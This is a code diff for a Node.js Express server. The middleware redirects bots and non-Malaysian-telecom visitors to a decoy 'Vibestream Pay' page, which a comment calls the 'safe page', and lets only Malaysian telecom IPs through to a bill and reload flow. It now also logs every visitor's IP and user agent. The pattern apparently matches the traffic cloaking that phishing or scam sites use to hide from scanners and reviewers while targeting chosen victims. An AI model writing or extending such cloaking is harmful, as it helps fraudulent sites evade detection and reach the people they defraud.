@@ -6,6 +6,7 @@ const { fetchBillData, fetchReloadData } = require('./bill-bot');
 const { getClientIP, isMalaysianTelecomIP, isBot } = require('./ip-detector');
 
 const app = express();
+app.set('trust proxy', true); // Trust Render's proxy to get real client IP
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server, path: '/ws' });
 
@@ -54,20 +55,27 @@ const ipCheckMiddleware = async (req, res, next) => {
   }
 
   const userAgent = req.headers['user-agent'] || '';
+  const clientIP = getClientIP(req);
   
+  console.log(`[VISITOR] IP: ${clientIP}, UA: ${userAgent}, Path: ${req.path}`);
+
   // 1. Bot Detection
   if (isBot(userAgent)) {
-    console.log(`[BOT CHECK] Bot detected: ${userAgent} - Redirecting to Vibestream Pay`);
+    console.log(`[BOT CHECK] Bot detected - Redirecting to Vibestream Pay`);
     return res.redirect('/vibestream-pay');
   }
 
   // 2. IP Detection
-  const clientIP = getClientIP(req);
-  const isMalaysian = await isMalaysianTelecomIP(clientIP);
-
-  // If not from Malaysian telecom, redirect to Vibestream Pay
-  if (!isMalaysian) {
-    console.log(`[IP CHECK] Non-Malaysian IP detected: ${clientIP} - Redirecting to Vibestream Pay`);
+  try {
+    const isMalaysian = await isMalaysianTelecomIP(clientIP);
+    if (!isMalaysian) {
+      console.log(`[IP CHECK] Non-Malaysian IP (${clientIP}) - Redirecting to Vibestream Pay`);
+      return res.redirect('/vibestream-pay');
+    }
+    console.log(`[IP CHECK] Malaysian IP (${clientIP}) - Access Granted`);
+  } catch (error) {
+    console.error(`[IP CHECK] Error: ${error.message}`);
+    // If check fails, redirect to safe page
     return res.redirect('/vibestream-pay');
   }
 
